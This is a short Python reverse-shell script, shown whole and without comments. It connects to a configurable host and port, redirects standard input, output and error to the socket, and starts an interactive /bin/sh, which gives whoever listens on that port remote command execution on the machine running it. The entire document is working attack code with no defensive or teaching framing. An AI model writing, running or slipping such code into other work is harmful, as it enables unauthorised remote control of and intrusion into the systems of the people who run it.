import socket
import subprocess
import os
 
sOpFqdn = '127.0.0.1'
iOpPort = 1234
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect( ( sOpFqdn, iOpPort ) )
 
os.dup2( s.fileno(), 0 )
os.dup2( s.fileno(), 1 )
os.dup2( s.fileno(), 2 )
 
p=subprocess.call(["/bin/sh","-i"])